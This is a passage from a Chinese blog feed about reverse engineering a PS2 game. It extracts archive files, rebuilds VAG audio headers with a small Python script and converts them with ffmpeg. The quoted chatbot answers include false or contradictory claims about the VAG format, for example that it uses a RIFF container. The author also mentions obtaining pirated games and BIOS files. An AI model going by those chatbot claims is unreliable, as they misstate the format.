反编译结果"></p>]]></content>
      
      
      <categories>
          
          <category> Hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReverseEngineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某上古 PS2 游戏逆向（二）音频分析</title>
      <link href="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="音频文件分析"><a href="# 音频文件分析" class="headerlink" title="音频文件分析"></a>音频文件分析 </h1><p> 根据文件名猜测角色音频保存在 <code>VOICE_ID.bin</code> 中，使用 Cube Media Player2 扫描 <code>VOICE_ID.bin</code> 可以发现里面保存的是 <code>adpcm</code> 格式的原始音频数据</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/11.jpg" alt="Cube Media Player2 扫描结果"></p><p>本来尝试直接利用 PSound 或者 Cube Media Player2 提取音频，自动转换到 wav 可以省很多事，但是发现这两个软件要么扫描的不全，要么扫描出来的音频是错的，所以折腾了半天，还是得自己手动提取。不过 Cube Media Player2 可以提供扫描到的音频的偏移以及长度，正好也验证了前文提取出来的文件内容是正确的。</p><p>Google 了一下，adpcm 是基于 pcm 的一种有损压缩编码，可以大幅压缩 pcm 数据，通常 wav 文件中就包含了原始的 pcm 或者 adpcm 数据，因此直接将 adpcm 转换为 wav 是有可能的，不过需要知道其对应的采样率、声道等信息。当然，以上信息来自 Google，不管是中文英文，大部分都是水文或者标题党，点名批评 CSDN，大部分文章点进去发现就介绍了一下 adpcm 算法，然后就介绍 wav 文件的格式，甚至连 adpcm 的格式都说不清楚，维基百科介绍的都比文章里介绍的言简意赅，搜了一个晚上和一个下午，愣是没查出来到底怎么把 adpcm 转换为 wav。</p><h1 id="AI 的智慧"><a href="#AI 的智慧" class="headerlink" title="AI 的智慧"></a>AI 的智慧 </h1><p> 手动将原始的 adpcm 拖到 Audacity 中使用 adpcm 格式确实可以听到一点点人声，但是噪声非常非常大。最后无奈求助人工智能，人工智能确实比网上不靠谱的文章靠谱的多，求助 bard，有了如下对话：</p><hr><p><strong>Srpopty</strong>: What is PS2 ADPCM Raw File?</p><p><strong>Bard</strong>: A PS2 ADPCM raw file is a type of audio file that is used to store audio data on the PlayStation 2 console. The file format is based on the ADPCM (Adaptive Differential Pulse-Code Modulation) compression algorithm, which is a lossy compression format that reduces the size of the audio file by discarding some of the data.</p><p>PS2 ADPCM raw files are typically stored in a .VAG file format. The file format consists of a header, which contains information about the audio data, and a data section, which contains the compressed audio data.</p><p>To play back a PS2 ADPCM raw file, you will need a software application that supports the .VAG file format. Some popular software applications that support the .VAG file format include:</p><ul><li><strong>Audacity</strong></li><li><strong>VLC Media Player</strong></li><li><strong>foobar2000</strong></li></ul><p>Once you have a software application that supports the .VAG file format, you can open the file and play it back.</p><p>Here are some of the advantages of using PS2 ADPCM raw files:</p><ul><li><strong>Small file size:</strong> The ADPCM compression algorithm used to create PS2 ADPCM raw files can significantly reduce the size of the audio file, making it easier to store and transfer.</li><li><strong>Wide compatibility:</strong> PS2 ADPCM raw files are supported by a wide variety of software applications, making them easy to play back.</li></ul><p>Here are some of the disadvantages of using PS2 ADPCM raw files:</p><ul><li><strong>Lossy compression:</strong> The ADPCM compression algorithm used to create PS2 ADPCM raw files discards some of the data, which can result in a loss of audio quality.</li><li><strong>Not suitable for all applications:</strong> PS2 ADPCM raw files are not suitable for all audio applications. For example, they are not suitable for high-fidelity audio, such as music or sound effects.</li></ul><p>Overall, PS2 ADPCM raw files are a convenient way to store and transfer audio data. However, it is important to be aware of the potential loss of audio quality that can occur when using this format.</p><hr><p>从这里可以得到一个很重要的信息 <code>PS2 ADPCM raw files are typically stored in a .VAG file format</code>，在 PS2 中音频经常使用 <code>.vag</code> 格式保存，并且还提醒我们可以用 <code>Audacity</code> 打开这种格式。</p><hr><p><strong>Srpopty</strong>: What is the  .VAG file format?</p><p><strong>Bard</strong>: A .VAG file is a sound file format developed by Sony for use in PlayStation games. It is a compressed format that uses the Adaptive Differential Pulse-Code Modulation (ADPCM) algorithm to reduce the size of the audio data.</p><p>.VAG files are typically 4-bit ADPCM, which means that each sample is represented by 4 bits of data. This results in a file size that is about one-quarter the size of a uncompressed 16-bit audio file.</p><p>.VAG files are stored in a RIFF (Resource Interchange File Format) container. The RIFF header contains information about the file, such as the number of channels, the sample rate, and the bit depth. The data section contains the compressed audio data.</p><p>.VAG files can be played back by software that supports the RIFF container format. Some popular software applications that can play back .VAG files include:</p><ul><li>Audacity</li><li>VLC Media Player</li><li>foobar2000</li></ul><p>.VAG files are a common format for storing sound effects and music in PlayStation games. They are also used in some other applications, such as video editing and audio recording.</p><p>Here are some of the advantages of using .VAG files:</p><ul><li><strong>Small file size:</strong> The ADPCM compression algorithm used to create .VAG files can significantly reduce the size of the audio file, making it easier to store and transfer.</li><li><strong>Wide compatibility:</strong> .VAG files are supported by a wide variety of software applications, making them easy to play back.</li></ul><p>Here are some of the disadvantages of using .VAG files:</p><ul><li><strong>Lossy compression:</strong> The ADPCM compression algorithm used to create .VAG files discards some of the data, which can result in a loss of audio quality.</li><li><strong>Not suitable for all applications:</strong> .VAG files are not suitable for all audio applications. For example, they are not suitable for high-fidelity audio, such as music or sound effects.</li></ul><p>Overall, .VAG files are a convenient way to store and transfer audio data. However, it is important to be aware of the potential loss of audio quality that can occur when using this format.</p><hr><p>从这段对话可以知道 <code>.VAG files can be played back by software that supports the RIFF container format</code>，<code>.vag</code> 保存在 RIFF 中，但是在我们提取出的文件中并没有看到 RIFF 文件头，于是尝试将 <code>VOICE_ID</code> 中的后缀名改为 <code>.vag</code>，再用 Audacity 打开，发现 Audacity 可以正常读取，设置采样率为 <code>22050</code> 可以听到清晰的人声，而 <code>VOCIDE_ID</code> 中第一个文件的人声刚好和 PSound 提取的相同，但是 PSound 只提取出了这一段声音的后半段。</p><h1 id="VAG 文件"><a href="#VAG 文件" class="headerlink" title="VAG 文件"></a>VAG 文件 </h1><p> 然而，尽管 ps2 使用 <code>.vag</code> 格式保存音频，但是 vag 仍然拥有固定的格式，例如在 vag2 和 vag3 的两个版本中都有不同的文件头</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Format Specifications (version 2)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - magic // &quot;VAGp&quot;</span><br><span class="line">4 bytes uint32 - format version  // &quot;2&quot;</span><br><span class="line">4 bytes (uint32) - source start offset // always &quot;0&quot;</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">2 bytes (uint16) - base volume for left channel</span><br><span class="line">2 bytes (uint16) - base volume for right channel</span><br><span class="line">2 bytes (uint16) - base pitch (includes fs modulation)</span><br><span class="line">2 bytes (uint16) - base ADSR1</span><br><span class="line">2 bytes (uint16) - base ADSR2</span><br><span class="line">2 bytes (uint16) - reserved area</span><br><span class="line">16 bytes (char) - track name</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Format Specifications (version 3)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - signature // &quot;VAGp&quot;</span><br><span class="line">4 bytes (uint32) - format version  // &quot;3&quot;</span><br><span class="line">4 bytes (uint32) - source start offset // always &quot;0&quot;</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">10 bytes - reserved area</span><br><span class="line">1 byte (uint8) - number of channels  // &quot;0&quot; or &quot;1&quot; --&gt; 1 channel</span><br><span class="line">                                     // &quot;2&quot; --&gt; 2 channels</span><br><span class="line">1 byte (uint8) - reserved area</span><br><span class="line">32 bytes (char) - track name  // e.g. &quot;s11_03/MD&quot;</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Format Specifications (version 6)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - signature // &quot;VAGp&quot;</span><br><span class="line">4 bytes (uint32) - format version  // &quot;6&quot;</span><br><span class="line">4 bytes (uint32) - reserved area</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">10 bytes - reserved area</span><br><span class="line">1 byte (uint8) - number of channels  // &quot;0&quot; or &quot;1&quot; --&gt; 1 channel</span><br><span class="line">                                     // &quot;2&quot; --&gt; 2 channels</span><br><span class="line">1 byte (uint8) - reserved area</span><br><span class="line">16 bytes (char) - track name  // e.g. &quot;s11_03/MD&quot;</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br></pre></td></tr></table></figure><p>在我们提取出的文件中并没有发现”VAGp”这个字符串，如下图所示 <code>VIOCE_ID.BIN</code> 的第一个文件</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/12.jpg" alt="VOICE_ID.BIN"></p><p>但是 Audacity 仍然可读，可以猜测我们提取出的只是裸数据，也就是 <code>waveform data</code>，仍然缺少文件头，意味着缺少例如采样率，声道数等信息，导致从 Audacity 导出时会将裸数据中的值解析为 vag 格式，例如导出为 mp3 时会警告</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/13.jpg" alt="Audacity 导出 mp3"></p><p>而 150999087，也就是 0x0900102f 刚好对应前面 0x10 位置处的 4 个字节，因此我们需要为裸数据填充合适的文件头。</p><p>在 Audacity 中设置采样率为 22050，单声道时可以听到清晰的人声，因此确定裸数据的采样率就是 22050，声道数为 1，32 位浮点。</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/14.jpg" alt="Audacity 波形图"></p><p>根据 Google 的 <a href="https://www.psdevwiki.com/ps3/Multimedia_Formats_and_Tools#VAG"> 结果</a>，在 PS3 中使用了第六版的 VAG，因此我们先从 verison 6 开始尝试添加 vag 文件头</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0000h: 56 41 47 70 00 00 00 06 00 00 00 00 00 01 07 00</span><br><span class="line">0010h: 00 00 56 22 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0020h: 74 65 73 74 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/15.jpg" alt="VAG 文件头"></p><p>首先添加了 4 个字节的”VAGp”字符串，然后添加了 4 个字节版本号为 6，接着 4 个字节保留位，接着 4 个字节是 adpcm 裸数据的大小，接着是 4 个字节采样率，也就是 22050，之后 10 个字节保留位，接 1 个字节的声道数，也就是 0 表示单声道，接着 1 个字节保留位，最后从 0x20 开始 16 个字节填写音轨名称，大端保存。然后用 ffmpeg 转换为 wav，发现可以正常转换，播放的声音也正常</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/16.jpg" alt="ffmpeg 转换结果"></p><h1 id="音频修复与转换"><a href="# 音频修复与转换" class="headerlink" title="音频修复与转换"></a>音频修复与转换 </h1><p> 基于以上分析的结果，可以写一个音频修复的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: vag.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#     Simply add a VAG6 header to raw vag data.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    filename = <span class="string">&quot;.&quot;</span>.join(filename.split(<span class="string">&quot;.&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    name = os.path.basename(filename)</span><br><span class="line">    name_part = name.split(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename + <span class="string">&quot;.vag&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">b&quot;\x56\x41\x47\x70&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x06&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">            + struct.pack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">int</span>(name_part[-<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x56\x22&quot;</span></span><br><span class="line">            + <span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">            + <span class="string">&quot;_&quot;</span>.join(name_part[:-<span class="number">1</span>]).encode().ljust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            + data</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 <code>xargs</code> 批量修复 <code>VOICE_ID</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.dat | xargs -I &#123;&#125; sh -c <span class="string">&#x27;echo &#123;&#125; &amp;&amp; python3 ./vag.py ./&#123;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>利用 <code>ffmpeg</code> 批量转换为 <code>.wavs</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.vag | <span class="built_in">cut</span> -d <span class="string">&#x27;.&#x27;</span> -f 1 | xargs -I &#123;&#125; ffmpeg -i &#123;&#125;.vag &#123;&#125;.wav</span><br></pre></td></tr></table></figure><p>到此，<code>VOICE_ID</code> 分析完成，同理可以提取出 <code>SOUND_ID</code> 中的音乐，发现 <code>SOUND_ID</code> 中存储的基本都是 BGM，除此以外，在 <code>SOUND_ID</code> 中还有一部分文件保存类似偏移或者长度的数据，例如 <code>1_0_14.dat</code></p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/1.jpg" alt="SOUND_ID.BIN"></p><p>经过观察可以发现每隔一定数量的 BGM 就会出现一个这种文件，一共出现 36 个，该文件长度固定为 20 字节，开始为固定的 4 字节的 <code>0x00</code>，结尾为 4 字节的 <code>0x00</code> 或者 <code>0xff</code>，中间可能是小端保存的 3 个 int，例如上图中间的 <code>0xac12</code>，<code>0x01</code> 以及 <code>0x1000</code> 三个数字。此外，还有 9 个空文件，例如第一个文件 <code>0_0_0.dat</code>。该文件的作用暂时未知，不影响我们对 <code>SOUIND_ID</code> 的分析以及提取。</p>]]></content>
      
      
      <categories>
          
          <category> Hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReverseEngineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某上古 PS2 游戏逆向（一）文件提取</title>
      <link href="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="# 前言" class="headerlink" title="前言"></a>前言 </h1><p> 最近几个月迷上了某上古动漫，希望借助 AI 技术复活动漫中的女主角。经过一番搜罗发现该动漫居然出过三款 PS2 文字冒险游戏，为了方便收集训练数据，需要从这三个 PS2 游戏中提取一些资源。然而毕竟是上古动漫，而且从来没接触过 PS2 的逆向，本文记录了一个 Web 狗针对一个上古 PS2 游戏的逆向全过程。</p><p>作为一个上古时期的动漫，第一款 PS2 游戏发售的时候北京奥运会都还没举行，因此在这个年代找到这三款上古游戏的资源确实是不容易，不过最终经过三天的努力，借助 Google Hacking 以及其他 Web 手段下载了这三款 <font style="color: black;background: black;"><del> 盗版 </del></font> 游戏。</p><p>PS2（Sony PlayStation2）是一款非常古老的游戏主机，在现代 Mac 系统上使用 <a href="https://pcsx2.net/">PCSX2 模拟器</a> 运行 PS2 游戏的效果还不错，不过需要下载 BIOS，当然，借助 Google Hacking 还是比较容易找到这些 PS2 的 BIOS，包括欧版，日版，美版等。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/1.jpg" alt="设置 PCSX2 的 BIOS"></p><p>逆向之前先试着玩了玩，确定三个游戏都可以正常运行，可惜都是日文，年代太久远了没有任何汉化，文字冒险游戏只看日文也确实玩不明白，只能听个响看个图，外网搜索了很久也几乎没人关注这个游戏的逆向，因此一切都需要从头开始。本文工作量较大，内容较多，将分为多个部分记录。</p><h1 id="目录结构与文件分析"><a href="# 目录结构与文件分析" class="headerlink" title="目录结构与文件分析"></a>目录结构与文件分析 </h1><p> 下载好的游戏都是常见的游戏光盘 iso 格式，直接打开 iso 就可以看到里面的目录。由于三个游戏都是同一家厂商开发，因此本文主要以其中一个游戏进行逆向。游戏本身 1.9G 左右，打开 iso 光盘里面的目录结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/Users/srpopty/Desktop/xxxx</span><br><span class="line">├── IOP</span><br><span class="line">│   ├── CDVDSTM.IRX</span><br><span class="line">│   ├── DBCMAN.IRX</span><br><span class="line">│   ├── DS2U_D.IRX</span><br><span class="line">│   ├── IOPRP310.IMG</span><br><span class="line">│   ├── LIBSD.IRX</span><br><span class="line">│   ├── MC2_D.IRX</span><br><span class="line">│   ├── MODHSYN.IRX</span><br><span class="line">│   ├── MODMIDI.IRX</span><br><span class="line">│   ├── SDRDRV.IRX</span><br><span class="line">│   ├── SIO2D.IRX</span><br><span class="line">│   ├── SIO2MAN.IRX</span><br><span class="line">│   ├── SKHSYNTH.IRX</span><br><span class="line">│   ├── SKMIDI.IRX</span><br><span class="line">│   ├── SKSOUND.IRX</span><br><span class="line">│   └── USBD.IRX</span><br><span class="line">├── MOVIE</span><br><span class="line">│   ├── MMVLOGO.PSS</span><br><span class="line">│   ├── WARP.PSS</span><br><span class="line">│   ├── ZERO3ED.PSS</span><br><span class="line">│   └── ZERO3OP.PSS</span><br><span class="line">├── NORMAL.BIN</span><br><span class="line">├── NORMAL.HD</span><br><span class="line">├── SCENEDAT.BIN</span><br><span class="line">├── SCENEDAT.HD</span><br><span class="line">├── SCENE_ID.BIN</span><br><span class="line">├── SCENE_ID.HD</span><br><span class="line">├── SLPS_258.97</span><br><span class="line">├── SOUND_ID.BIN</span><br><span class="line">├── SOUND_ID.HD</span><br><span class="line">├── SYSTEM.BIN</span><br><span class="line">├── SYSTEM.CNF</span><br><span class="line">├── SYSTEM.HD</span><br><span class="line">├── VOICE_ID.BIN</span><br><span class="line">└── VOICE_ID.HD</span><br><span class="line"></span><br><span class="line">3 directories, 33 files</span><br></pre></td></tr></table></figure><p>大概了解一些 PS2 的开发基础，相较于现代游戏主机，PS2 的开发较为自由，换句话说就是不太规范，各种文件、脚本、字节码这些格式开发者甚至可以自己定义。</p><p>首先在 CD 根目录中，<code>SLPS_xxx.xx</code> 一般作为游戏主程序，也就是主要入口，游戏运行时首先执行的就是就是这个程序，从 <code>SYSTEM.CNF</code> 中也能看到这个信息，<code>file</code> 一下也可以看到是 32 位的 mips，静态链接，无符号表，可以用 IDA 反汇编，或者直接用 Ghidra 反编译。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, MIPS, MIPS-III version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>此外还可以看到两个目录 <code>IOP</code> 和 <code>MOVIE</code>。在 PS2 中，<code>IOP</code> 类似 Windows 的 <code>.dll</code> 以及 Unix 的 <code>.so</code>，属于动态链接库，<code>file</code> 一下目录中的 <code>.IRX</code> 文件也可以看到是和 <code>SLPS_xxx.xx</code> 一样的 MIPS ELF，但是单靠文件名暂时不好判断其功能。而在 <code>MOIVE</code> 中的 <code>.PSS</code> 是一种视频文件格式，可以直接用 VLC 播放，但是没有声音，包括了厂商 logo、开头的 OP、结束的 ED 以及一个 <code>WARP</code> 视频。</p><p>之后在 CD 根目录下可以看到很多同名的 <code>.BIN</code> 和 <code>.HD</code> 文件，包括 <code>NORMAL</code>，<code>SCENE_ID</code>，<code>SCENEDAT</code>，<code>SOUND_ID</code>，<code>VOICE_ID</code> 以及 <code>SYSTEM</code>，用 <code>file</code> 或者 <code>binwalk</code> 也查不出来是什么类型的文件。</p><p>通过分析 <code>.BIN</code> 文件和 <code>.HD</code> 文件的大小（如下表所示），推测 <code>.HD</code> 与 <code>.BIN</code> 存在对应关系，<code>.BIN</code> 可能是多个文件打包，而 <code>.HD</code> 则存储了映射关系。</p><table><thead><tr><th>Name</th><th>NORMAL</th><th>SCENE_ID</th><th>SCENEDAT</th><th>SOUND_ID</th><th>VOICE_ID</th><th>SYSTEM</th></tr></thead><tbody><tr><td>.BIN</td><td>12 MB</td><td>7.4b MB</td><td>171 MB</td><td>363 MB</td><td>1.2 GB</td><td>906 KB</td></tr><tr><td>.HD</td><td>2.6 KB</td><td>2.3 KB</td><td>8.4 KB</td><td>724 B</td><td>83 KB</td><td>168 B</td></tr></tbody></table><p>首先根据文件名以及对应的文件大小可以大致猜出，<code>SCENEDAT</code> 中保存的可能是各种场景资源，例如贴图，<code>SOUND_ID</code> 中保存的是音效，而最大的 <code>VOICE_ID</code> 中保存的可能就是角色的语音。</p><p>本文的最终目标是提取出角色声音，也就是 <code>VOICE_ID</code> 中的音频以及对应的文本作为训练数据。</p><h1 id="BIN 文件提取"><a href="#BIN 文件提取" class="headerlink" title="BIN 文件提取"></a>BIN 文件提取 </h1><p> 既然 <code>.HD</code> 和 <code>.BIN</code> 是存在对应关系，那么首先要想办法利用 <code>.HD</code> 从 <code>.BIN</code> 中提取文件。首先以最小的 <code>SYSTEM</code> 为例，用 010 Editor 查看可以看到 <code>SYSTEM.BIN</code> 中保存了类似代码的明文数据</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/2.jpg" alt="SYSTEM.BIN"></p><p>并且每隔一段距离就会出现大量的 <code>0xff</code>，类似分隔符</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/3.jpg" alt="SYSTEM.BIN"></p><p>虽然可以看到类似代码的明文，但是其中也夹杂了很多不可见字符，此外明文中也可以看到很多 for、if 这种语法结构，因此不可能是某种语言的字节码，那么直接用文本模式打开 <code>SYSTEM</code> 可以看到不可见字符全部出现在了类似 C 风格的注释中。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/4.jpg" alt="SYSTEM.BIN"></p><p>考虑到这是个日本发行商的游戏，因此猜测可能是日文注释，重新用日文编码 <code>Shift JIS</code> 打开文件可以看到正常的文件内容，果然是用日语写注释。。。</p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/5.jpg" alt="SYSTEM.BIN"></p><p>尽管目前可以看到某种类似脚本语言的明文代码，但是每隔一段代码都会出现大量的 <code>0xff</code></p><p><img src="/2023/06/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%80%EF%BC%89/6.jpg" alt="SYSTEM.BIN"></p><p>同时打开其他几个 <code>.BIN</code> 文件，也可以看到每隔一段就会出现大量的 